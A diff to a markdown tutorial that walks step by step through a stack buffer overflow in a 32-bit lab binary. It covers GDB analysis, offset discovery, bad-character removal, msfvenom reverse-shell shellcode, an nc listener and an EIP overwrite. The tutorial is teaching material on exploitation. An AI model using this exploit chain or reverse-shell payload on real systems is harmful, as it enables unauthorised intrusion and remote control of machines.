@@ -71,7 +71,7 @@ There are some vulnerable functions in C, for example:
 
 GDB is the **GNU Debugger**, standard debugger for Unix Systems. It can work with many language as C, C++, Objective-C, FORTRAN, Java... 
 We use GDB to view the created binary on the assembler level. Once we have executed the binary with GDB, we can disassemble the program's main function.
-```console
+```
 zero@pio$ gdb -q bow32
 
 Reading symbols from bow...(no debugging symbols found)...done.
@@ -143,7 +143,7 @@ zero@pio$ echo 'set disassembly-flavor intel' > ~/.gdbinit
 ```
 
 And now:
-```console
+```
 zero@pio$ gdb ./bow32 -q
 
 Reading symbols from bow...(no debugging symbols found)...done.
@@ -227,7 +227,7 @@ Registers are the essential components of a CPU. Almost all registers offer a sm
 Since the stack starts with a high address and grows down to low memory addresses as values are added, the **Base Pointer** points to the beginning (base) of the stack in contrast to the **Stack Pointer**, which points to the top of the stack. As the stack grows, it is logically divided into regions called Stack Frames, which allocate the required memory in the stack for the corresponding function. A stack frame defines a frame of data with the beginning (**EBP**) and the end (**ESP**) that is pushed onto the stack when a function is called.
 
 Since the stack memory is built on a Last-In-First-Out (**LIFO**) data structure, the first step is to store the previous **EBP** position on the stack, which can be restored after the function completes. If we now look at the bowfunc function, it looks like following in GDB:
-```console
+```
 (gdb) disas bowfunc 
 
 Dump of assembler code for function bowfunc:
@@ -242,7 +242,7 @@ Dump of assembler code for function bowfunc:
 
 The **EBP** in the stack frame is set first when a function is called and contains the **EBP** of the previous stack frame. Next, the value of the **ESP** is copied to the **EBP**, creating a new stack frame.
 
-```console
+```
 (gdb) disas bowfunc 
 
 Dump of assembler code for function bowfunc:
@@ -258,7 +258,7 @@ Dump of assembler code for function bowfunc:
 Then some space is created in the stack, moving the **ESP** to the top for the operations and variables needed and processed.
 
 These three functions are called **Prologue**.
-```console
+```
 (gdb) disas bowfunc 
 
 Dump of assembler code for function bowfunc:
@@ -272,7 +272,7 @@ Dump of assembler code for function bowfunc:
 ```
 
 For getting out of the stack frame, the opposite is done, the **Epilogue**. During the epilogue, the **ESP** is replaced by the current **EBP**, and its value is reset to the value it had before in the prologue.
-```console
+```
 (gdb) disas bowfunc 
 
 Dump of assembler code for function bowfunc:
@@ -309,7 +309,7 @@ bow64: ELF 64-bit LSB shared object
 ```
 
 Looking at the assembler code:
-```console
+```
 zero@pio$ gdb -q bow64
 
 Reading symbols from bow64...(no debugging symbols found)...done.
@@ -339,7 +339,7 @@ The most important instruction for us right now is the **call** instruction. The
 2. it changes the **Instruction Pointer** (**EIP**) to the call destination and starting execution there
 
 With the Intel Syntax:
-```console
+```
 zero@pio$ gdb ./bow32 -q
 
 Reading symbols from bow...(no debugging symbols found)...done.
@@ -391,7 +391,7 @@ We can execute commands in GDB using Python, which serves us directly as input.
 ### Segmentation Fault
 
 If we insert 1200 "U"s (hex "**55**") as input, we can see from the register information that we have overwritten the **EIP**. As far as we know, the **EIP** points to the next instruction to be executed.
-```console
+```
 zero@pio$ gdb -q bow32
 
 (gdb) run $(python -c "print '\x55' * 1200")
@@ -401,7 +401,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x55555555 in ?? ()
 ```
 
-```console
+```
 (gdb) info registers 
 
 eax            0x1	1
@@ -435,7 +435,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9
 ```
 
 Now replace the 1200 "U"s with the pattern:
-```console
+```
 gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 
 
 The program being debugged has been started already.
@@ -447,21 +447,21 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 
 We see that the EIP displays a different memory address:
-```console
+```
 (gdb) info registers eip
 
 eip            0x69423569	0x69423569
 ```
 
 We can use another MSF tool called "**pattern_offset**" to calculate the exact number of characters (offset) needed to advance to the **EIP**:
-```console
+```
 zero@pio$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
 
 [*] Exact match at offset 1036
 ```
 
 If we now use precisely this number of bytes for our "U"s, we should land exactly on the **EIP**. To overwrite it and check if we have reached it as planned, we can add 4 more bytes with "\x66" and execute it to ensure we control the **EIP**.
-```console
+```
 (gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")
 
 The program being debugged has been started already.
@@ -477,7 +477,7 @@ Now we see that we have overwritten the **EIP** with our "\x66" characters. Next
 ## Determine the Length for Shellcode 
 
 It is trendy and useful for us to exploit such a vulnerability to get a reverse shell. First, we have to find out approximately how big our shellcode will be that we will insert, and for this, we will use **msfvenom**.
-```console
+```
 zero@pio$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c 
 
 No encoder or badchars specified, outputting raw payload
@@ -519,7 +519,7 @@ zero@pio$ echo $CHARS | sed 's/\\x/ /g' | wc -w
 ```
 
 This string is 256 bytes long. So we need to calculate our buffer again. If we execute it now, the program will crash without giving us the possibility to follow what happens in the memory. So we will set a breakpoint at the corresponding function so that the execution stops at this point, and we can analyze the memory's content.
-```console
+```
 (gdb) disas main
 Dump of assembler code for function main:
    0x56555582 <+0>: 	lea    ecx,[esp+0x4]
@@ -555,14 +555,14 @@ End of assembler dump.
 ```
 
 Let's add the command `break`:
-```console
+```
 (gdb) break bowfunc 
 
 Breakpoint 1 at 0x56555551
 ```
 
 Now we can execute it. Send the char:
-```console
+```
 (gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
 
 Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
@@ -572,7 +572,7 @@ Breakpoint 1, 0x56555551 in bowfunc ()
 ```
 
 Now we can look at the **Stack**:
-```console
+```
 (gdb) x/2000xb $esp+500
 
 0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
@@ -589,7 +589,7 @@ Now we can look at the **Stack**:
 ```
 
 Here we recognize at which address our "\x55" begins. From here, we can go further down and look for the place where our CHARS start.
-```console
+```
 <SNIP>
 0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
 0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
@@ -605,7 +605,7 @@ Here we recognize at which address our "\x55" begins. From here, we can go furth
 If we look closely at it, we will see that it starts with `\x01` instead of `\x00`. We have already seen the warning during the execution that the **null byte** in our input was ignored. So we can note this character, remove it from our variable CHARS and adjust the number of our `\x55`.
  
 Let's see how many we need:
-```console
+```
 # Substract the number of removed characters
 Buffer = "\x55" * (1040 - 255 - 4) = 781
 
@@ -616,7 +616,7 @@ Buffer = "\x55" * (1040 - 255 - 4) = 781
 ```
 
 Now send the CHARS without Null Byte:
-```console
+```
 (gdb) run $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
 
 The program being debugged has been started already.
@@ -627,7 +627,7 @@ Breakpoint 1, 0x56555551 in bowfunc ()
 ```
 
 The Stack now will look:
-```console
+```
 (gdb) x/2000xb $esp+550
 
 <SNIP>
@@ -653,7 +653,7 @@ Buffer = "\x55" * (1040 - 254 - 4) = 782
 ```
 
 Now send the CHAR without `\x00` and `\x09`:
-```console
+```
 (gdb) run $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
 
 The program being debugged has been started already.
@@ -664,7 +664,7 @@ Breakpoint 1, 0x56555551 in bowfunc ()
 ```
 
 The Stack now will be:
-```console
+```
 (gdb) x/2000xb $esp+550
 
 <SNIP>
@@ -686,7 +686,7 @@ Before we generate our shellcode, we have to make sure that the individual compo
 - Bad Characters
 
 To generate with **msfvenom**:
-```console
+```
 zero@pio$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
 
 Found 11 compatible encoders
@@ -711,7 +711,7 @@ Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
 ```
 
 Now send it and check it:
-```console
+```
 (gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
 
 The program being debugged has been started already.
@@ -741,8 +741,10 @@ To exploit it, first start a nc:
 zero@pio$ nc -lnvp 31337
 ```
 
+Change the **EIP** by some address after `\x50` (for example from `0xffffd64c` -> `\x4c\xd6\xff\xff`).
+
 In the gbd:
-```console
+```
 (gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
 ```
 
